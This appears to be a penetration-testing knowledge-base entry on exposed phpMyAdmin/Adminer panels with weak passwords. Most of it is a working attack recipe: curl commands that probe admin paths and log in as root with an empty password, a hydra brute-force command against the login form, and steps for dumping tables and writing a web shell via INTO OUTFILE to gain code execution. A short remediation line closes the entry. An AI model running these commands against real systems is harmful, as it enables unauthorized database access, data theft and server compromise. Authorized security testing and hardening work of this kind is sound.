---
title: Exposed phpMyAdmin / Adminer (direct database access with weak passwords)
cve: None (configuration flaw)
severity: critical
cvss: 9.0
product: phpMyAdmin / Adminer / BT Panel pma
versions: Any
ports: 80, 443, 888, 8080
keywords: phpmyadmin, adminer, pma, database, weak passwords, database dumping
entry: /phpmyadmin/  /pma/  /adminer.php
verified: false
sources: Compiled from public sources (configuration flaws)
---

## Fingerprints

```
GET /phpmyadmin/       → 200 login page
GET /adminer.php       → 200 single file
GET /pma/              → pma bundled with BT Panel
```

## Prerequisites

- Management tools exposed to the public internet.

## PoC

```bash
# 1) Probe paths
for p in /phpmyadmin/ /pma/ /adminer.php /db/ /mysql/; do
  echo "$p $(curl -s -o /dev/null -w '%{http_code}' "https://target$p")"
done

# 2) Empty root password (common with BT Panel pma)
curl -s 'https://target/pma/index.php' -d 'pma_username=root&pma_password=&server=1' -o /tmp/pma.html
grep -qi 'logout\|Server' /tmp/pma.html && echo "Logged in with an empty password"

# 3) Weak passwords
hydra -l root -P /usr/share/wordlists/rockyou.txt target http-post-form \
  '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:F=Cannot log in'
```

## Exploitation Steps

1. Probe paths first (read-only);
2. Empty password → weak passwords → BT Panel pma (BT Panel's default root account matches the panel account);
3. After entering the database, inspect the `user/admin/member` table structures first and export a small sample as proof;
4. If RCE is needed, use `INTO OUTFILE` to write a web shell (confirm secure_file_priv and the web directory);
5. Evidence: successful login page + table-structure screenshot (redacted).

## Remediation and Mitigation

- Restrict pma/adminer to internal networks; disable remote root access; apply least privilege to database accounts.

## References

- phpMyAdmin security recommendations.
